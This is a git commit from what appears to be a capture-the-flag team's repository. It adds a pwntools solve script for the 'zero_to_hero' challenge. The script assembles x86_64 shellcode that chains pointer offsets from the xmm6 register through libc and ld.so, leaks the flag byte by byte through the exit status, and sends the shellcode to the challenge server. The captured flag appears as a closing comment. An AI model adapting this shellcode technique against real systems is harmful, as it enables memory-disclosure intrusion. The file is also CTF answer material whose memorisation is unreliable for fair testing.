6a6f79bb525df6ec3a87b0db0c8d8fcf6d0870df
CaptainNapkins <legoman8@me.com>
2024-04-21 18:38:24 -0400

    added snoopy and zero_to_hero solves after pr merges

---
+++ pwn/zero_to_hero/solve/sol.py
@@ -0,0 +1,42 @@
+from pwn import *
+
+# 1) xmm6 lo = libc/.got + 0x67c0
+# 2) at libc/.got + 0x90: address of _rtld_global
+# 3) ld.so/.bss = _rtld_global + 0xfa0
+# 4) at ld.so/.bss + 0x50: address of .interp in z2h
+# 5) z2h/.bss = z2h/.interp + 0x3d48
+# 6) flag = z2h/.bss + 0x20
+
+
+def getFlagChar(offset):
+  payloadASM = f"""
+    endbr64
+    movq rax, xmm6
+    mov rbx, [rax - 0x67c0 + 0x90]
+    mov rcx, [rbx + 0xfa0 + 0x50]
+    mov rdi, [rcx + 0x3d48 + 0x20 + {offset}]
+    mov eax, 0x3c
+    syscall
+  """
+
+  payload = asm(payloadASM, arch = "x86_64").hex()
+
+  r = remote("gold.b01le.rs", 4005)
+  r.sendline(payload.encode())
+  r.recvuntil(b"value: ")
+  ans = int( r.recvuntil(b"\n") )
+  r.close()
+
+  return ans
+
+
+flag = b""
+for i in range(100):
+  c = getFlagChar(i)  
+  flag += bytes([c])
+  print(flag)
+  if flag[-1:] == b"}":  break
+
+
+
+#b'bctf{x86_64_r3g1sTer_bL0at_sAVe5_7he_d4y:D_%#$*}'
